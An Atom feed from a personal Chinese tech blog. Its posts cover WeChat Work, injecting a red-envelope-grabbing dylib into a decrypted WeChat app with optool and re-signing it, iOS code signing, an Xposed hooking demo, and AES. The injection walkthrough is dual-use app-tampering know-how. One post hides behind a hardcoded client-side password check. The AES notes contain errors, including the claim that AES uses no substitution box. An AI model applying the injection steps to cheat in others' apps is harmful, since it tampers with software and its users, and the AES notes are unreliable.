<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FloatingGuy&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-06-27T06:49:42.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>FloatingGuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【调研】微信企业版</title>
    <link href="http://yoursite.com/2017/06/27/%E3%80%90%E8%B0%83%E7%A0%94%E3%80%91%E5%BE%AE%E4%BF%A1%E4%BC%81%E4%B8%9A%E7%89%88/"/>
    <id>http://yoursite.com/2017/06/27/【调研】微信企业版/</id>
    <published>2017-06-27T06:29:07.000Z</published>
    <updated>2017-06-27T06:49:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<a id="more"></a>
<script>
    if( prompt("Please input password") !== String(10086) )
    {
        alert('密码错误！');
        self.location='https://floatingguy.github.io/about/';
        // history.back();
    } else {
        alert("密码正确");
    }
</script>


<p>调研企业版微信。<br>需求分析：</p>
<ol>
<li>各个平台要能数据互通<ul>
<li>iOS/Android/Windows/Mac</li>
</ul>
</li>
<li>资金成本<ul>
<li>目前没发现需要收费，应为服务器这些腾讯免费提供了</li>
<li>可能需要企业资质的材料 （应该是没有也行）</li>
</ul>
</li>
<li>展示各个商家获取积压情况<ul>
<li>下面会在 <code>场景</code>里演示</li>
</ul>
</li>
<li>网上下订单<ul>
<li>应该是可以的，应为提供了微信支付的接口。</li>
<li>但是官方没有给对应的APP</li>
</ul>
</li>
</ol>
<h1 id="企业版："><a href="#企业版：" class="headerlink" title="企业版："></a>企业版：</h1><blockquote>
<p>关注需要认证，认证通过以后才可以加入</p>
</blockquote>
<p><img src="/include/img/life/DF8E8972F859C785969E598CE32F4E5D.jpg" alt=""></p>
<p>欢迎扫描加入 <code>仙山瓜子</code><br><img src="/include/img/life/F8BA33CCA91F43FD3E82BB47F810E822.jpg" alt=""></p>
<h2 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h2><ul>
<li>打卡（无提醒）</li>
<li>日报</li>
<li>创建企业应用</li>
<li>同事吧 （论坛）</li>
<li>公告 （只能是管理员发送信息，无限制）</li>
<li>设置部门<ul>
<li>商家一个部门</li>
<li>送货员一个部门</li>
<li>所有发货商一个部门</li>
<li>。。。</li>
</ul>
</li>
<li>其他</li>
</ul>
<p>功能可通过SDK扩展， 具体需求安排在TODO 中。</p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><ol>
<li>针对 个人的限制</li>
<li>针对 部门的限制</li>
<li><p>影藏的部门<br><img src="/include/img/life/848BE5ACEB34856B71B5B8AAD83395ED.jpg" alt=""></p>
</li>
<li><p>分级管理员 （企业老板）<br><img src="/include/img/life/7B85FC781ED14DAE1180EAB8C04AAF2D.jpg" alt=""></p>
</li>
</ol>
<h2 id="使用场景-（重要）"><a href="#使用场景-（重要）" class="headerlink" title="使用场景 （重要）"></a>使用场景 （重要）</h2><blockquote>
<p>送货员负责记录商家 货物积压情况，并且及时的通知上游发货方， 发货方可以在电脑端（软件， 网页）查看具体的信息。</p>
</blockquote>
<p>人员角色：</p>
<ul>
<li>送货员A</li>
<li>商家B</li>
<li>发货人， 也是 汇报人</li>
</ul>
<p>步骤：</p>
<ol>
<li><p>前期准备：<br>当需要发货的时候,发货方可以提前在微信告知 <code>送货员A</code>, <code>送货员A</code> 取货以后运送到<code>商家B</code>, 检查商家货物积压情况。</p>
</li>
<li><p>送货员 记录信息上传服务器<br><code>送货员A</code>完成对商家存货情况的了解,<code>送货员A</code>就可以在手机端 <code>打卡</code>了。</p>
<ul>
<li>如果没有积压， 没有什么要 特殊交待的事情，那么直接打卡 【完成】发货就OK了。</li>
<li>如果有 积压等重要信息需要记录，那么在打卡处 简单说明告知 后期会通过 <code>日报</code>的方式发送具体详细的信息。<br>（注意：员工 打卡的汇报人接收不到提醒消息， 只能自己主动查看）</li>
</ul>
</li>
</ol>
<blockquote>
<p>[建议]这里可以创建一个  <code>打卡</code>模板 和 <code>日报</code>模板。</p>
</blockquote>
<p><img src="/include/img/life/42DD76E6263D7D646A583033793953BC.jpg" alt=""><br><img src="/include/img/life/1094F97425E8F185CC6A96E65A07145B.jpg" alt=""><br>汇报人在手机/电脑上可以查看到 送货员的打卡消息。</p>
<ol>
<li>发货方查看消息 （web 端为例）</li>
</ol>
<p><img src="/include/img/life/EA4FA565F289E739F4975B3A94247C93.jpg" alt=""></p>
<p>（iphone 上查看打卡列表）<br>每个 送货员收集的商家的情况一目了然。</p>
<p>如果有<code>日报</code>发送给<code>汇报人</code>， 那么<code>汇报人</code>的手机微信企业版有提醒。</p>
<p><img src="/include/img/life/7A39D7C7C1163BE10C360CED2D54C660.jpg" alt=""><br>（iphone 上查看 日报）<br>评论区可以聊天，建议送货员发送完<code>日报</code>就发送一条评论可以提醒 <code>发货方</code>查看。</p>
<ol>
<li>通过 网页端汇总日报</li>
</ol>
<p><img src="/include/img/life/2C135F4461DB6120E5E0982B49C65CAD.jpg" alt=""><br>所有的<code>日报</code>都是可以导出到电脑上， 方便<code>发货人</code>对 积压情况数据做进一步分析、处理， 下图是导出到电脑上显示。<br><img src="/include/img/life/4E6D8B0CAFCAB48ADF3CC1726648645F.jpg" alt=""></p>
<blockquote>
<p>[建议] 再次建议制定 <code>日报</code>模板</p>
</blockquote>
<h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>使用<code>打卡</code>的好处：发货方在手机 可以看到每个送货员的打卡列表，一目了然 不用在聊天记录里一个一个翻看（提高用户体验）</p>
<p><code>日报</code>的好处：关键是 可以导出数据，在电脑上使用表格软件做排序还可以打印出来做长远的方案参考资料，制定下一个季度的方案。使用的好的化可以杜绝出现货物积压导致过期损失资金的情况。</p>
<p>不足：</p>
<ul>
<li>Web端没有数据导入功能</li>
<li>功能不够完善</li>
<li>该软件的定位还清晰，不清楚具体针对的人群</li>
</ul>
<h2 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h2><ul>
<li>开发后台数据处理接口</li>
<li>优化网页端控制</li>
<li>权限管理优化</li>
<li>打卡 提醒的功能</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="wechat" scheme="http://yoursite.com/tags/wechat/"/>
    
  </entry>
  
  <entry>
    <title>iOS 免越狱注入技术</title>
    <link href="http://yoursite.com/2017/06/21/iOS-%E5%85%8D%E8%B6%8A%E7%8B%B1%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2017/06/21/iOS-免越狱注入技术/</id>
    <published>2017-06-21T06:31:17.000Z</published>
    <updated>2017-06-21T06:35:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p><a href="http://www.swiftyper.com/2016/12/26/wechat-redenvelop-tweak-for-non-jailbroken-iphone/" target="_blank" rel="external">免越狱版 iOS 抢红包插件</a></p>
<a id="more"></a>
<p>技能： 在非越狱手机上注入dylib 到APP</p>
<h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><ol>
<li><p>砸壳</p>
<ul>
<li>我从91 上下载没壳，直接用iFunBox 拖出来</li>
<li>使用 Cluth 放到手机里即可脱壳<ul>
<li>/private/var/mobile/Documents/Dumped/xx.ipa 脱壳后的ips</li>
</ul>
</li>
</ul>
</li>
<li><p>编译得到dylib</p>
</li>
<li><p>修改依赖项的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; otool -L WeChatRedEnvelop.dylib   # 查看dylib的依赖项</div><div class="line"></div><div class="line">&gt; scp root@&lt;your.device.ip&gt;:/usr/lib/libsubstrate.dylib .</div><div class="line">&gt; install_name_tool -change /usr/lib/libsubstrate.dylib @loader_path/libsubstrate.dylib WeChatRedEnvelop.dylib   修改dylib中依赖库的路径</div></pre></td></tr></table></figure>
<p><img src="/include/img/ios/55BE71EECA18CD8ADD2144AF0F4AC6AC.jpg" alt=""></p>
<p>注意: 貌似新版的theos 使用CydiaSubstrate替代了 libsubstrate.dylib（本质上应该还是一个东西）。<br>网上给出的办法：<a href="https://github.com/buginux/WeChatRedEnvelop/issues/35" target="_blank" rel="external">方法一</a>、<a href="http://bbs.iosre.com/t/ios/6119/15" target="_blank" rel="external">方法二</a><br><img src="/include/img/ios/BDC1CFC3EFF21C86AE5668F04A2104E3.jpg" alt=""></p>
<p>我在从越狱的手机里搞到了libsubstrate.dylib，然后按照作者正文的方法 直接-change成@loader_path/libsubstrate.dylib 一样是没问题的。</p>
</li>
<li><p>注入 dylib 到ipa内的二进制文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; unzip wechat.ipa -d wechat</div><div class="line">&gt; cp libsubstrate.dylib WeChatRedEnvelop.dylib wechat/Payload/WeChat.app</div><div class="line">&gt; optool install -c load -p &quot;@executable_path/WeChatRedEnvelop.dylib&quot; -t wechat/Payload/WeChat.app/WeChat</div></pre></td></tr></table></figure>
</li>
<li><p>重打包 &amp; 签名<br><img src="/include/img/ios/4A5E7F43C23CA9C8FF5251E10AD2DC32.jpg" alt=""></p>
</li>
<li>安装</li>
</ol>
<ul>
<li>用impactor 吧，使用ifunbox 和 xcode的都出现了 </li>
<li>xcode安装<br><img src="/include/img/ios/97D6BCB1E3E8D0F9CC62412BC489C25B.jpg" alt=""></li>
</ul>
<ol>
<li>测试</li>
</ol>
<table>
<thead>
<tr>
<th>设备</th>
<th>状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>iphone 5 (jailbreak)</td>
<td>可安装</td>
</tr>
<tr>
<td>iphone 6 (no jailbreak) 白手机</td>
<td>可安装</td>
</tr>
</tbody>
</table>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;http://www.swiftyper.com/2016/12/26/wechat-redenvelop-tweak-for-non-jailbroken-iphone/&quot;&gt;免越狱版 iOS 抢红包插件&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="iOS" scheme="http://yoursite.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS 供应配置文件和代码签名</title>
    <link href="http://yoursite.com/2017/06/21/iOS-%E4%BE%9B%E5%BA%94%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%92%8C%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D/"/>
    <id>http://yoursite.com/2017/06/21/iOS-供应配置文件和代码签名/</id>
    <published>2017-06-21T06:21:55.000Z</published>
    <updated>2017-06-21T06:29:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p><a href="http://blog.csdn.net/phunxm/article/details/42685597" target="_blank" rel="external">iOS Provisioning Profile(Certificate)与Code Signing详解</a></p>
<a id="more"></a>
<p>什么是App ID？Explicit/Wildcard App ID有何区别？什么是App Group ID？</p>
<ul>
<li>Explicit 表示唯一的app id， 即Bundle identifier</li>
<li>Wildcard 是含有通配符的App ID, 可以表示 一个组织，团体的应用。比如以 com.apple.*开头就是 苹果公司的 应用</li>
</ul>
<p>什么是 苹果设备的 特征？</p>
<ul>
<li>UDID （unique Device identify） 来唯一标识每台设备。</li>
<li>使用itunes 和 xcode-&gt;window-&gt;Devices 可以查看到UDID。</li>
</ul>
<p>什么是证书（Certificate）？如何申请？有啥用？</p>
<ul>
<li>ios 证书分类：<ol>
<li>Development 证书 用来 开发 和调试</li>
<li>Production 证书 用来分发应用<br>每个开发者一共可以 将上面2类证书 各自注册 2个。<br><img src="/include/img/ios/252DC953F90B24AE9EDE451EE7C70E90.jpg" alt=""><br>（AWWDR签发的临时证书）</li>
</ol>
</li>
</ul>
<p>什么是Key Pair（公钥/私钥）？有啥用？与证书有何关联？</p>
<ul>
<li>Xcode 中配置的 Code Signing Identity（entitlements、certificate）必须与 Provisioning Profile 匹配，并且配置的 Certificate 必须在本机 Keychain Access 中存在对应 Public／Private Key Pair，否则编译会报错。</li>
<li>Xcode 所在的 Mac 设备（系统）使用 CA 证书（WWDRCA.cer）来判断 Code Signing Identity 中 Certificate 的合法性：<ul>
<li>若用 WWDRCA 公钥能成功解密出证书并得到公钥（Public Key）和内容摘要（Signature），证明此证书确乃 AppleWWDRCA 颁布，即证书来源可信；</li>
<li>再对证书本身使用哈希算法计算摘要，若与上一步得到的摘要一致，则证明此证书未被篡改过，即证书完整。</li>
</ul>
</li>
</ul>
<p>什么是签名（Signature）？如何签名（CodeSign）？怎样校验（Verify）？</p>
<ul>
<li>私钥签名，公钥验证。链式验证<ul>
<li>Xcode 使用指定证书配套的私钥进行签名时需要授权，选择【始终允许】后，以后使用该私钥进行签名便不会再弹出授权确认窗口。<br><img src="/include/img/ios/BE7CB5F068CADDD7EBED516D7BB1D52B.jpg" alt=" "></li>
</ul>
</li>
</ul>
<p>什么是（Team）Provisioning Profiles？有啥用？</p>
<ul>
<li>供应配置文件 （Provisioning Profiles）</li>
<li>该文件包含的内容：App ID, 证书 和  设备ID</li>
<li>打包App 到真机运行的流程：<ul>
<li>指明 App ID，并且验证 Bundle ID 是否与其一致；</li>
<li>需要证书对应的私钥来进行签名，用于标识这个 APP 是合法、安全、完整的；</li>
<li>如果是真机调试，需要确认这台设备是否授权运行该 APP。</li>
</ul>
</li>
<li>Provisioning Profile 分类：<ul>
<li>Development  分发app 使用</li>
<li>Distribution 提交给App Store 审核 （不需要指定 devices， 因为最终上架会给任何设备安装）</li>
</ul>
</li>
<li>构成<br>（1）Name：该mobileprovision的文件名。<br>（2）UUID：该mobileprovision文件的真实文件名。<br>（3）TeamName：Apple ID账号名。<br>（4）TeamIdentifier：Team Identity。<br>（5）AppIDName：explicit/wildcard App ID name（ApplicationIdentifierPrefix）。<br>（6）ApplicationIdentifierPrefix：完整App ID的前缀（TeamIdentifier.*）。<br>（7）DeveloperCertificates：包含了可以为使用该配置文件应用签名的所有证书<data><array>。<br>（8）Entitlements 键<key>对应的<dict>：<br>（9）ProvisionedDevices：该mobileprovision授权的开发设备的UDID <array>。</array></dict></key></array></data></li>
<li><code>~/Library/MobileDevice/Provisioning Profiles</code> 这个目录下存储这 所有的 Provisioning Profiles</li>
<li>Team Provisioning Profile 开发组供应配置文件</li>
</ul>
<p>Xcode如何配置才能使用iOS真机进行开发调试？<br>多台机器如何共享开发者账号或证书？<br>遇到证书配置问题怎么办？<br>Xcode 7免证书调试真机调试</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/phunxm/article/details/42685597&quot;&gt;iOS Provisioning Profile(Certificate)与Code Signing详解&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="iOS" scheme="http://yoursite.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>Xposed Hook 操作手册</title>
    <link href="http://yoursite.com/2017/06/18/%E5%BC%80%E5%8F%91/Xposed-Hook-%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2017/06/18/开发/Xposed-Hook-操作手册/</id>
    <published>2017-06-18T08:58:36.000Z</published>
    <updated>2017-06-19T01:18:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>xposed 是专门针对Android 系统定制的一套框架。该框架的作用是给开发者提供一套接口，使用该接口并配合着一定的逆向技术就可以达到修改Android 系统服务(Framework层)， 修改系统APP功能，或者修改普通APP功能的目的。</p>
<p>该框架hook的原理简单说来，就是替换Android zygote进程为Xposed 修改过的zygote (对应app_process进程）。之所以修改Zygote 最主要的目的就是替换将XposedBridge 框架插入到Zygote加载的库中这样zygote fork 出的所有子进程都共享XposedBridge库。<br>（这篇文章的重点在应用，不过多关注原理）。</p>
<a id="more"></a>
<p>Xposed 开发语言：Java</p>
<p>支持的系统版本：Android(&lt;7.x)</p>
<p>目前主要的问题：</p>
<ul>
<li>不能hook 抽象函数</li>
<li>不能hook 内部类</li>
<li>只能hook java函数</li>
</ul>
<h1 id="创建一个Xposed-Module"><a href="#创建一个Xposed-Module" class="headerlink" title="创建一个Xposed Module"></a>创建一个Xposed Module</h1><p>步骤：</p>
<ol>
<li>创建一个no Activity 的app<br> 包名：<code>floatg.xposeddemo</code></li>
<li>新建一个Java Class<br> 类名：<a href="#class"><code>MyClass</code></a></li>
<li>创建assets 目录，并创建<code>xposed_init</code> 文件<br> 路径：<a href="#xposed_init"><code>src/main/assets/xposed_init</code></a></li>
<li>修改 <a href="#AndroidManifest.xml"><code>AndroidManifest.xml</code></a> 文件</li>
<li>修改 <a href="#build.gradle"><code>build.gradle</code></a></li>
<li><p>删除 <code>res/values</code> 目录下除 strings.xml 的所有文件, 其他xml 文件做相应的修改。</p>
<p><span id="class"></span></p>
<h2 id="floatg-xposeddemo-MyClass"><a href="#floatg-xposeddemo-MyClass" class="headerlink" title="floatg.xposeddemo.MyClass"></a>floatg.xposeddemo.MyClass</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> floatg.xposeddemo;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by floatg on 2017/6/17.</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</div><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</div><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedBridge.log;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> <span class="keyword">implements</span>  <span class="title">IXposedHookLoadPackage</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.android.systemui"</span>))</div><div class="line">            <span class="keyword">return</span>;</div><div class="line"></div><div class="line">        findAndHookMethod(<span class="string">"com.android.systemui.statusbar.policy.Clock"</span>, lpparam.classLoader, <span class="string">"updateClock"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">                TextView tv = (TextView) param.thisObject;</div><div class="line">                String text = tv.getText().toString();</div><div class="line">                tv.setText(text + <span class="string">" :)"</span>);</div><div class="line">                tv.setTextColor(Color.RED);</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p><span id="xposed_init"></span></p>
<h2 id="xposed-init"><a href="#xposed-init" class="headerlink" title="xposed_init"></a>xposed_init</h2><p><code>floatg.xposeddemo.MyClass</code></p>
<p><span id="build.gradle"></span></p>
<h2 id="build-gradle"><a href="#build-gradle" class="headerlink" title="build.gradle"></a>build.gradle</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">dependencies &#123;</div><div class="line">    compile fileTree(dir: <span class="string">'libs'</span>, include: [<span class="string">'*.jar'</span>])</div><div class="line">    androidTestCompile(<span class="string">'com.android.support.test.espresso:espresso-core:2.2.2'</span>, &#123;</div><div class="line">        exclude group: <span class="string">'com.android.support'</span>, module: <span class="string">'support-annotations'</span></div><div class="line">    &#125;)</div><div class="line">    //compile <span class="string">'com.android.support:appcompat-v7:24.2.1'</span></div><div class="line">    //<span class="built_in">test</span>Compile <span class="string">'junit:junit:4.12'</span></div><div class="line">    //关键是 这个jar不能编译到app中，因为Xposed 系统已经提供了，必须是provided, 而不是compile</div><div class="line">    provided files(<span class="string">'provided/XposedBridgeApi-82.jar'</span>)</div><div class="line">    //如果需要引入文档，方便查看的话</div><div class="line">    provided <span class="string">'de.robv.android.xposed:api:82:sources'</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注释掉下面2条<br>compile ‘com.android.support:appcompat-v7:24.2.1’<br>testCompile ‘junit:junit:4.12’</p>
<p>增加<br>provided files(‘provided/XposedBridgeApi-82.jar’)</p>
<p><span id="AndroidManifest.xml"></span></p>
<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">application</span></span></div><div class="line">    <span class="attr">android:xx</span></div><div class="line">    <span class="attr">android:yy</span>  &gt;</div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">            <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></div><div class="line">            <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</div><div class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">            <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></div><div class="line">            <span class="attr">android:value</span>=<span class="string">"xposed module to bypass authentication"</span> /&gt;</div><div class="line">        <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">            <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></div><div class="line">            <span class="attr">android:value</span>=<span class="string">"53"</span> /&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></div></pre></td></tr></table></figure>
<p><strong>注意：一定要在 applitcation 标签内部添加，不然模块在install中显示不出来。</strong></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
<li><p>xposed 原理：<br><a href="http://blog.csdn.net/innost/article/details/50461783" target="_blank" rel="external">深入理解Android之Xposed详解</a></p>
</li>
<li><p>反hook:<br><a href="http://gnaixx.cc/2016/09/03/android-anti-hooking/index.html" target="_blank" rel="external">Android Java层的anti-hooking技巧</a></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;xposed 是专门针对Android 系统定制的一套框架。该框架的作用是给开发者提供一套接口，使用该接口并配合着一定的逆向技术就可以达到修改Android 系统服务(Framework层)， 修改系统APP功能，或者修改普通APP功能的目的。&lt;/p&gt;
&lt;p&gt;该框架hook的原理简单说来，就是替换Android zygote进程为Xposed 修改过的zygote (对应app_process进程）。之所以修改Zygote 最主要的目的就是替换将XposedBridge 框架插入到Zygote加载的库中这样zygote fork 出的所有子进程都共享XposedBridge库。&lt;br&gt;（这篇文章的重点在应用，不过多关注原理）。&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="hook" scheme="http://yoursite.com/tags/hook/"/>
    
      <category term="xposed" scheme="http://yoursite.com/tags/xposed/"/>
    
  </entry>
  
  <entry>
    <title>AES加密算法回顾</title>
    <link href="http://yoursite.com/2017/06/09/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%9B%9E%E9%A1%BE/"/>
    <id>http://yoursite.com/2017/06/09/AES加密算法回顾/</id>
    <published>2017-06-09T01:26:58.000Z</published>
    <updated>2017-06-18T08:44:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p><img src="/include/img/aes1.JPG" alt=""></p>
<a id="more"></a>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><p>密码算法的本质： <strong>替换</strong> 和 <strong>置换</strong></p>
<h2 id="攻击加密算法的方法"><a href="#攻击加密算法的方法" class="headerlink" title="攻击加密算法的方法"></a>攻击加密算法的方法</h2><ul>
<li>差分攻击 Differential attack</li>
<li>线性攻击 Linear attack</li>
</ul>
<h2 id="认识AES-算法"><a href="#认识AES-算法" class="headerlink" title="认识AES 算法"></a>认识AES 算法</h2><p><a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86" target="_blank" rel="external">AES 加密算法</a> – Rijndael</p>
<p>Rijndael 的特性:</p>
<ul>
<li>rijndael  加密不采用 算术运算。</li>
<li>数据块长度 128bit, 192bit, 256bit</li>
<li>密钥长度 128bit, 192bit, 256bit</li>
<li>数据块和密钥长度相互独立</li>
<li>运算的轮数可变</li>
<li>因为不采用算数运算，所有处理器硬件的差异对其影响较小</li>
<li>轮变换可以并行处理</li>
<li>不使用替换盒</li>
<li>子密钥生成速度快</li>
<li>潜在的平行运算</li>
</ul>
<p>应用到AES 时对数据块长度做出规定，必须是128bit.</p>
<p>AES加密过程是在一个4×4的字节矩阵上运作，这个矩阵又称为“体（state）”，其初值就是一个明文区块（矩阵中一个元素大小就是明文区块中的一个Byte）。（Rijndael加密法因支持更大的区块，其矩阵行数可视情况增加）加密时，各轮AES加密循环（除最后一轮外）均包含4个步骤：</p>
<ol>
<li><code>MixColumns</code>—为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。</li>
<li><code>SubBytes</code>—通过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li>
<li><code>ShiftRows</code>—将矩阵中的每个横列进行循环式移位。</li>
<li><code>AddRoundKey</code>—矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。<br>在第一轮前，whitening AK 操作被执行；最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey取代。</li>
</ol>
<p>每一个步骤具体的操作原理，请参考<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86" target="_blank" rel="external">维基百科</a></p>
<h2 id="实现AES-算法"><a href="#实现AES-算法" class="headerlink" title="实现AES 算法"></a>实现AES 算法</h2><p>这类代码网上很多了, 我随便搜到了这篇 <a href="http://www.cnblogs.com/luop/p/4334160.html" target="_blank" rel="external">密码算法详解——AES</a>。 文章还没有细看只看了评论，方便后期学习 我这里贴下部分代码，<a href="https://github.com/openluopworld/aes_128" target="_blank" rel="external">完整代码</a></p>
